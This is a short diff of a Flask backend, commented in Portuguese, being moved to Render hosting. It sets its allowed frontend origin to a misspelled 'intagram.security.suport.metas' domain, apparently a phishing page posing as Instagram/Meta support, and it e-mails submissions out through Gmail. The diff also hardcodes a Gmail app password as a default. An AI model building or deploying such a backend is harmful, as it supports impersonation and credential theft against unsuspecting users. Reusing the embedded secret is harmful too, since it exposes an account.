@@ -6,7 +6,7 @@ from email.mime.multipart import MIMEMultipart
 import os
 
 app = Flask(__name__)
-CORS(app)  # permite requisições do frontend em outra porta
+CORS(app, origins=["https://intagram.security.suport.metas.onrender.com"])  # libera o frontend hospedado no Render
 
 # Configurações
 PP_PASSWORD = os.getenv("PP_PASSWORD", "kzgk szfq brzm nbqm")  # senha do app Gmail
@@ -42,6 +42,8 @@ def enviado():
         print("Erro enviando email:", e)
         return jsonify({"error": "Falha ao enviar e-mail", "detail": str(e)}), 500
 
+
 if __name__ == "__main__":
-    # Roda acessível na rede local, porta 3000
-    app.run(host="0.0.0.0", port=3000, debug=True)
+    # Render define a porta automaticamente
+    port = int(os.environ.get("PORT", 3000))
+    app.run(host="0.0.0.0", port=port)
